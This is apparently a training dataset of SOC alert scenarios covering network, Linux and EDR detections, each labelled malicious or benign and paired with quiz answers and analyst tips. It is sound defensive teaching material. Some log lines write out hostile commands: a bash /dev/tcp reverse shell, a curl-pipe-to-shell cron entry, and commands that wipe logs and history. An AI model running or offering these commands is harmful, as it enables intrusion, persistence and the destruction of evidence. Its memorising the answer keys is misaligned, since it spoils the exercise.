@@ -1,0 +1,366 @@
+# ON SHIFT alerts — part 3: network, Linux, EDR/AV, misc
+- id: n01
+  d: network
+  src: Firewall · Palo Alto TRAFFIC
+  t: Periodic outbound beacon
+  h: WS-ENG-0410 → 193.x.x.x:443
+  l: [connections every 60s ± 5s for 9 hours, bytes out ~ 1.2 KB each · no SNI · JA3 matches Cobalt Strike default]
+  v: 1
+  x: T1071.001
+  c: periodic-beacon
+  k: [1]
+  diff: 2
+  say: Connections every sixty seconds for nine hours with low jitter, no server name, matching a Cobalt Strike fingerprint.
+  tell: Clockwork 60-second check-ins with low jitter, no SNI, and a Cobalt Strike JA3. That is C2 asking "any orders?" all night.
+- id: n02
+  d: network
+  src: Firewall · Palo Alto TRAFFIC
+  t: Periodic outbound beacon
+  h: WS-FIN-0588 → 52.x.x.x:443
+  l: [connections every 300s for 3 days, 'SNI: client.wns.windows.com', 'process (from EDR): svchost.exe -k netsvcs']
+  v: 0
+  x: T1071.001
+  c: periodic-beacon
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: Connections every five minutes for three days to a Microsoft push-notification name, from the service host process.
+  tell: 'Windows push notifications beacon by design. Microsoft SNI, svchost, Microsoft IP space. Beaconing alone is not malicious: check SNI and process.'
+- id: n03
+  d: network
+  src: DNS · Windows DNS analytic
+  t: High-volume DNS TXT queries
+  h: WS-DEV-0512
+  l: ['4,300 TXT queries in 1 hr to *.cdn-cache-ns[.]xyz', 'subdomain: 60-char base32 strings, e.g. MZXW6YTBOI2DMNZQ...']
+  v: 1
+  x: T1071.004
+  c: dns-txt-volume
+  k: [0, 1]
+  diff: 2
+  say: Four thousand text-record queries in an hour to one domain, using long base-thirty-two labels as subdomains.
+  tell: Thousands of long base32 subdomains + TXT records to one sketchy domain = data being smuggled through DNS. dnscat2 / iodine style.
+- id: n04
+  d: network
+  src: DNS · Windows DNS analytic
+  t: High-entropy DNS queries
+  h: WS-MKT-0233
+  l: ['900 queries/hr to *.cloudfront.net, *.akamaiedge.net', 'subdomains: d1a2b3c4d5e6f7.cloudfront.net style', 'process: chrome.exe']
+  v: 0
+  x: T1071.004
+  c: dns-txt-volume
+  k: [2]
+  diff: 2
+  trap: scary
+  say: Nine hundred queries an hour to content delivery networks with random-looking hostnames, from Chrome.
+  tell: CDNs use random-looking hostnames constantly. Chrome hitting CloudFront and Akamai is the internet working. Entropy needs context.
+- id: n05
+  d: network
+  src: Proxy · Zscaler
+  t: Large upload to file sharing
+  h: SRV-FS-08 → mega.nz
+  l: ['user agent: rclone/v1.66', 'uploaded: 48 GB over 3 hours', 'time: 01:00-04:00 Saturday']
+  v: 1
+  x: T1567.002
+  c: data-exfil-upload
+  k: [0]
+  diff: 2
+  say: A file server uploaded forty-eight gigabytes to a file-sharing site over three hours, starting one in the morning on a weekend.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Block MEGA only, Throttle the upload, Isolate the server and preserve evidence]
+    a: 2
+    why: Exfil precedes encryption; isolate and capture.
+  tell: rclone from a file server to MEGA at 1am on a weekend. That is the double-extortion exfil step right before encryption. Ransomware crews love rclone.
+- id: n06
+  d: network
+  src: Proxy · Zscaler
+  t: Large upload to cloud storage
+  h: WS-DES-0044 → wetransfer.com
+  l: ['user: tfunk (design)', 'uploaded: 3.2 GB · files: *.psd, *.ai', 'business hours · client: Chrome']
+  v: 0
+  x: T1567.002
+  c: data-exfil-upload
+  k: [2]
+  diff: 2
+  trap: scary
+  say: A designer uploaded three gigabytes of Photoshop and Illustrator files to a transfer site during business hours through Chrome.
+  tell: Designer sends huge PSDs to an agency through WeTransfer during work hours. Check your DLP policy, not your IR runbook.
+- id: n07
+  d: network
+  src: Firewall · Fortinet
+  t: Internal SMB scanning
+  h: WS-REC-0092 → 10.20.0.0/16
+  l: ['TCP 445 to 2,048 hosts in 4 min', TCP 3389 to 512 hosts, source is a front desk PC]
+  v: 1
+  x: T1046
+  c: internal-scan
+  k: [2]
+  diff: 2
+  say: A front-desk PC connected to file-sharing and remote-desktop ports across thousands of hosts in four minutes.
+  tell: A front desk PC sweeping /16 for SMB and RDP. That is someone mapping targets for lateral movement, or a worm. Either way, isolate.
+- id: n08
+  d: network
+  src: Firewall · Fortinet
+  t: Internal port scan
+  h: SRV-SCAN-01 → 10.0.0.0/8
+  l: ['TCP 1-65535 to 9,000 hosts', 'source: Tenable Nessus scanner', 'schedule: weekly, Sunday 02:00']
+  v: 0
+  x: T1046
+  c: internal-scan
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: A vulnerability scanner connected to every port across nine thousand hosts, on its weekly Sunday schedule.
+  tell: Your vuln scanner scans. Allowlist it in detections, but watch for scans from it outside its schedule. Attackers love to hide behind the scanner.
+- id: n09
+  d: network
+  src: VPN · Cisco ASA
+  t: VPN brute force
+  h: vpn.corp.com
+  l: ['4,800 failed logins in 30 min from 900 IPs', 'usernames: alphabetical (aaron, abby, adam…)', 'then: 1 success for "admin.test" (no MFA)']
+  v: 1
+  x: T1110.003
+  c: password-spray-brute
+  k: [2]
+  diff: 2
+  say: Forty-eight hundred failed VPN logins from nine hundred addresses, then one success on a test account with no multi-factor.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Reset all VPN users, Disable the MFA-less test account and block the IPs, Email the VPN team]
+    a: 1
+    why: Kill the account that let them in.
+  tell: Distributed spray against the VPN, and it found a test account without MFA. Every ransomware report starts with "VPN account without MFA". Disable it now.
+- id: n10
+  d: network
+  src: Firewall · Palo Alto THREAT
+  t: Exploit attempt blocked
+  h: internet → vpn.corp.com
+  l: ['signature: Ivanti Connect Secure command injection (CVE-2024-21887)', 'action: reset-both · 1 attempt', 'source: mass-scanner ASN']
+  v: 0
+  x: T1190
+  c: internet-bg-noise
+  k: [1]
+  diff: 2
+  trap: scary
+  say: 'Palo Alto threat log: a command injection signature for the VPN appliance, reset on both sides, one attempt, from a mass-scanner network.'
+  tell: Internet background radiation. A single blocked exploit attempt from a known scanner is noise. But confirm you are patched, and hunt if you were not.
+- id: n11
+  d: network
+  src: Web server · IIS logs
+  t: New .aspx in aspnet_client receiving POSTs
+  h: SRV-WEB-07
+  l: [POST /aspnet_client/system_web/errorEE.aspx 200, 'sizes: 120-900 bytes · interval: irregular', 'file created: 3 days ago (no deploy)']
+  v: 1
+  x: T1505.003
+  c: webshell-activity
+  k: [2]
+  diff: 2
+  say: A newly created page in the ASP-dot-net client folder, not deployed by anyone, is receiving small irregular POSTs.
+  tell: A new .aspx in aspnet_client nobody deployed, getting POSTs = webshell. That folder is a classic Exchange/IIS hiding spot.
+- id: n12
+  d: network
+  src: Firewall · Palo Alto TRAFFIC
+  t: Traffic to Tor
+  h: SRV-APP-31 → 185.220.x.x:9001
+  l: ['app: tor', 'process (EDR): C:\ProgramData\tor\tor.exe', 'server role: billing app']
+  v: 1
+  x: T1090.003
+  c: covert-tunnel-egress
+  k: [1, 2]
+  diff: 2
+  say: A billing application server is running the Tor client from program data, connecting to a Tor entry port.
+  tell: A billing server running tor.exe from ProgramData. Ransomware operators tunnel C2 and exfil through Tor. Servers have zero reason to.
+- id: l01
+  d: linux
+  src: Linux · auditd
+  t: 'auditd: php-fpm child exec'
+  h: web-prod-07 · www-app
+  l: ['exec: bash -c "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"', 'parent: php-fpm']
+  v: 1
+  x: T1059.004
+  c: reverse-shell
+  k: [0]
+  diff: 1
+  say: A web process launched an interactive shell redirected to an external address and port, parented by P-H-P-F-P-M.
+  tell: bash -i to /dev/tcp is a reverse shell, and php-fpm as parent means a web app vuln got popped. www-app just called home.
+- id: l02
+  d: linux
+  src: Linux · auditd
+  t: Cron job modified
+  h: db-prod-01 · root
+  l: ['file: /etc/cron.d/pg_backup', 'content: 0 2 * * * postgres /usr/local/bin/pg_backup.sh', 'changed via: Ansible (ansible-playbook backup.yml)']
+  v: 0
+  x: T1053.003
+  c: cron-persist
+  k: [2]
+  diff: 2
+  trap: scary
+  say: A backup cron file was written matching the configuration-management playbook, changed through Ansible.
+  tell: Config management writing a backup cron that matches its playbook. Cron changes are only scary when nobody can tell you who made them.
+- id: l03
+  d: linux
+  src: Linux · auditd
+  t: Cron job modified
+  h: web-prod-12 · www-data
+  l: ['file: /var/spool/cron/crontabs/www-data', 'content: */5 * * * * curl -fsSL http://45.x.x.x/k.sh | sh', no Ansible run]
+  v: 1
+  x: T1053.003
+  c: cron-persist
+  k: [1, 2]
+  diff: 1
+  say: A web-user crontab runs a command every five minutes that pipes a remote shell script straight into the shell.
+  tell: curl | sh every 5 minutes from a web user crontab. That is persistence that re-infects even after cleanup. Often a cryptominer.
+- id: l04
+  d: linux
+  src: Linux · auditd
+  t: SSH authorized_keys changed
+  h: bastion-01 · root
+  l: ['file: /root/.ssh/authorized_keys', 'added: ssh-rsa AAAAB3NzaC1yc2E... (comment: "x")', 'process: echo (parent: bash via reverse shell PID 3311)']
+  v: 1
+  x: T1098.004
+  c: ssh-authkeys
+  k: [2]
+  diff: 2
+  say: A new root SSH key with a junk comment was appended, written from a shell tied to a reverse-shell process.
+  tell: New root SSH key with a junk comment, added from a reverse-shell bash. Now they do not need the exploit anymore. Remove the key and rotate everything.
+- id: l05
+  d: linux
+  src: Linux · auth.log
+  t: SSH brute force
+  h: sftp-ext-01 (internet-facing)
+  l: ['Failed password for root from 61.x.x.x: 12,000 in 24h', 'successful logins: 0', 'PasswordAuthentication: no (keys only)']
+  v: 0
+  x: T1110.001
+  c: internet-bg-noise
+  k: [1, 2]
+  diff: 2
+  trap: scary
+  say: Twelve thousand failed root SSH attempts in a day against an internet-facing server, zero successes, keys only.
+  tell: Internet-facing SSH gets hammered 24/7. Zero successes and key-only auth = noise. Escalate on a success, not on attempts.
+- id: l06
+  d: linux
+  src: Linux · Sysmon for Linux
+  t: High CPU unknown binary
+  h: k8s-node-07 · uid 1001
+  l: ['process: /tmp/.X11-unix/kdevtmpfsi', 'CPU: 390% · conn: pool.supportxmr.com:3333']
+  v: 1
+  x: T1496
+  c: cryptomining
+  k: [1]
+  diff: 1
+  say: A binary hidden in a temp directory is pegging the processor and talking to a Monero mining pool.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Just kill the process, Kill the miner and find the exposed entry point, Reboot the node]
+    a: 1
+    why: Without closing the entry, it returns on reboot.
+  tell: Binary hiding in /tmp/.X11-unix, pegging CPU, talking to a Monero pool. Kinsing-style cryptojacking. Usually through an exposed container or Docker API.
+- id: l07
+  d: linux
+  src: Linux · auditd
+  t: Sudo to root shell
+  h: app-prod-02 · deploy
+  l: ['cmd: sudo systemctl restart nginx', 'sudoers: deploy ALL=(root) NOPASSWD: /bin/systemctl restart nginx', 'during: CI deploy job #4471']
+  v: 0
+  x: T1548.003
+  c: sudo-context
+  k: [1]
+  diff: 2
+  trap: scary
+  say: A deploy account used a scoped password-free sudo rule to restart only the web server, during a deploy job.
+  tell: Scoped NOPASSWD sudo for exactly one command, during a deploy. That is least privilege done right.
+- id: l08
+  d: linux
+  src: Linux · auditd
+  t: Log tampering
+  h: web-prod-19 · root
+  l: ['cmd: echo > /var/log/auth.log; history -c; unset HISTFILE', 'parent: bash (session from 203.0.113.9)']
+  v: 1
+  x: T1685.006
+  c: log-clearing
+  k: [0]
+  diff: 2
+  say: A session cleared the authentication log and shell history, coming from the same address as a reverse shell.
+  tell: Wiping auth.log and shell history from a session out of the reverse shell IP. They are cleaning up on the way out. Grab memory and disk now.
+- id: l09
+  d: linux
+  src: Kubernetes · audit log
+  t: Privileged pod created
+  h: 'cluster: prod-aks · ns: default'
+  l: ['pod: debug-x · image: alpine', 'securityContext: privileged: true · hostPID: true · hostPath: /', 'user: system:serviceaccount:default:default']
+  v: 1
+  x: T1611
+  c: container-escape
+  k: [1]
+  diff: 2
+  say: A privileged pod was created with host process namespace and the whole host filesystem mounted, from the default service account.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Delete the pod only, Restart the cluster, Delete the pod and lock down the default service account]
+    a: 2
+    why: Fix the RBAC that let a default SA go privileged.
+  tell: Privileged pod with hostPID and the whole host filesystem mounted, from the default service account. That is a container escape in YAML form.
+- id: x01
+  d: edr
+  src: Defender Antivirus · 1116
+  t: Hacktool detected
+  h: WS-IT-0198 · ssato
+  l: ['threat: HackTool:Win64/Mimikatz', 'path: C:\Users\ssato\Downloads\mimi\x64\mimikatz.exe', 'action: quarantined']
+  v: 1
+  x: T1003.001
+  c: mimikatz-present
+  k: [1]
+  diff: 1
+  say: Antivirus quarantined a Mimikatz hack tool found in the downloads folder of an IT admin account.
+  tell: Quarantined does not mean closed. Why does an IT admin have Mimikatz in Downloads? Either an unsanctioned "test" or a compromised admin. Find out.
+- id: x02
+  d: edr
+  src: Defender Antivirus · 1116
+  t: Potentially unwanted app
+  h: WS-MKT-0377 · trose
+  l: ['threat: PUA:Win32/Wajam', 'path: ...\AppData\Local\Temp\free_pdf_converter_setup.exe', 'action: blocked · no execution']
+  v: 0
+  x: T1204.002
+  c: pua-adware
+  k: [2]
+  diff: 1
+  trap: scary
+  say: Antivirus blocked a potentially unwanted adware bundle inside a free PDF converter before it could run.
+  tell: Adware bundled in a free PDF converter, blocked before execution. Close it and send the user a "please stop" link. PUA is hygiene, not an incident.
+- id: x03
+  d: edr
+  src: Defender for Endpoint · Alert
+  t: Tampering with sensor
+  h: SRV-APP-44 · SYSTEM
+  l: ['action: attempt to stop Sense service', 'process: C:\Windows\Temp\tdsskiller.exe (renamed: av.exe)', 'driver loaded: vulnerable signed driver (BYOVD)']
+  v: 1
+  x: T1687
+  c: disable-security-control
+  k: [2]
+  diff: 2
+  say: An attempt to stop the sensor service came from a renamed tool in temp, after a vulnerable signed driver loaded.
+  q:
+    kind: contain
+    ask: First action?
+    o: [Isolate the host before the driver finishes killing EDR, Update the driver, Restart the Sense service]
+    a: 0
+    why: BYOVD precedes detonation; isolate immediately.
+  tell: A vulnerable signed driver loaded to kill your EDR. Bring Your Own Vulnerable Driver is how ransomware crews go invisible right before detonation.
+- id: x04
+  d: edr
+  src: Defender for Endpoint · Alert
+  t: Suspicious PowerShell download
+  h: WS-ENG-0144 · bwalsh
+  l: ['cmd: iwr https://community.chocolatey.org/install.ps1 -UseBasicParsing | iex', 'user role: developer · device: dev-tools policy', 'followed by: choco install nodejs']
+  v: 0
+  x: T1059.001
+  c: iwr-iex-context
+  k: [0]
+  diff: 2
+  trap: scary
+  say: A developer piped the official Chocolatey install script into execution, then installed Node, on a dev-tools machine.
+  tell: iwr | iex looks exactly like a download cradle, but it is the official Chocolatey installer on a dev box, followed by installing Node. The domain is the difference.
